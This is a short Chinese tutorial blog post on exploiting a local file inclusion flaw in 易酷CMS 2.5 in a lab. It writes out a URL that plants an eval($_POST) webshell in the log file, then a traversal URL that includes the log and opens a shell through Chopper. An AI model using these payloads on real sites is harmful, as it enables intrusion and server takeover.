易酷CMS是一款影片播放CMS。该CMS2.5版本存在本地文件包含漏洞。我们可以利用这个漏洞，让其包含日志文件，然后再利用报错信息将一句话[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)写入日志中。然后利用文件包含漏洞包含该日志文件，再用菜刀连接拿shell。

渗透之前的操作，比如先用后台扫描工具，扫描得到该网站的后台目录结构，才更好的进行后面的操作。

我们通过访问该url，将一句话木马写入日志文件中

[http://192.168.10.22/index.php?s=my/show/id/{~eval($\_POST\[x\])}](http://192.168.10.22/index.php?s=my/show/id/%7B~eval%28$_POST%5Bx%5D%29%7D "http://192.168.10.22/index.php?s=my/show/id/{~eval($_POST[x])}")

![](https://img-blog.csdnimg.cn/20181128192246673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell

[http://192.168.10.22/index.php?s=my/show/id/\\..\\temp\\logs\\18\_11\_28.log](http://192.168.10.22/index.php?s=my/show/id/%5C..%5Ctemp%5Clogs%5C18_11_28.log "http://192.168.10.22/index.php?s=my/show/id/\..\temp\logs\18_11_28.log")

![](https://img-blog.csdnimg.cn/20181128192849728.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[文件包含漏洞](https://blog.csdn.net/qq_36119192/article/details/82823685 "文件包含漏洞")

                  [一句话木马提权](https://blog.csdn.net/qq_36119192/article/details/84562454 "一句话木马提权")